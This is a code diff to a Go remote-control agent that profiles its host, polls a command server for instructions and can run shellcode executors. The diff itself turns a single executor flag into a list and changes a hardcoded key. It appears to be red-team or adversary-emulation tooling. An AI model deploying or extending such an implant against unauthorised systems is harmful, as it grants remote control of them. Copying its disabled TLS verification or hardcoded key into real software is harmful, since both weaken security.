@@ -10,6 +10,7 @@ import (
 	"reflect"
 	"runtime"
 	"strconv"
+	"strings"
 	"time"
 
 	"./api"
@@ -18,7 +19,10 @@ import (
 	"./util"
 )
 
+type executorFlags []string
+
 var iteration = 10
+var executors executorFlags
 
 func askForInstructions(profile map[string]interface{}) {
 	commands := api.Instructions(profile)
@@ -36,7 +40,7 @@ func askForInstructions(profile map[string]interface{}) {
 	}
 }
 
-func buildProfile(server string, group string, executor string) map[string]interface{} {
+func buildProfile(server string, group string, executors []string) map[string]interface{} {
 	host, _ := os.Hostname()
 	user, _ := user.Current()
 	paw := fmt.Sprintf("%s$%s", host, user.Username)
@@ -50,28 +54,39 @@ func buildProfile(server string, group string, executor string) map[string]inter
 	profile["location"] = os.Args[0]
 	profile["pid"] = strconv.Itoa(os.Getpid())
 	profile["ppid"] = strconv.Itoa(os.Getppid())
-	profile["executors"] = getExecutors(executor, arch)
+	profile["executors"] = checkShellcodeExecutors(executors, arch)
 	return profile
 }
 
-func getExecutors(executor string, arch string) []string {
-	executors := []string{executor}
+func checkShellcodeExecutors(executors []string, arch string) []string {
 	if shellcode.IsAvailable() {
 		executors = append(executors, "shellcode_"+arch)
 	}
 	return executors
 }
 
+func (i *executorFlags) String() string {
+	return fmt.Sprint((*i))
+}
+
+func (i *executorFlags) Set(value string) error {
+	for _, exec := range strings.Split(value, ",") {
+		*i = append(*i, exec)
+	}
+	return nil
+}
+
 func main() {
 	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
+	executors = []string{execute.DetermineExecutor(runtime.GOOS)}
 	server := flag.String("server", "http://localhost:8888", "The FQDN of the server")
 	group := flag.String("group", "my_group", "Attach a group to this agent")
-	executor := flag.String("executor", execute.DetermineExecutor(runtime.GOOS), "Select a primary executor")
+	flag.Var(&executors, "executors", "List of executors")
 	flag.Parse()
-	profile := buildProfile(*server, *group, *executor)
+	profile := buildProfile(*server, *group, executors)
 	for {
 		askForInstructions(profile)
 	}
 }
 
-var key = "WRE9E82AJN1H5CDEZMMFKCS6QNV0N1"
+var key = "8HBMZ63TC0BU75VRNJ7A0SGRBWMIOY"
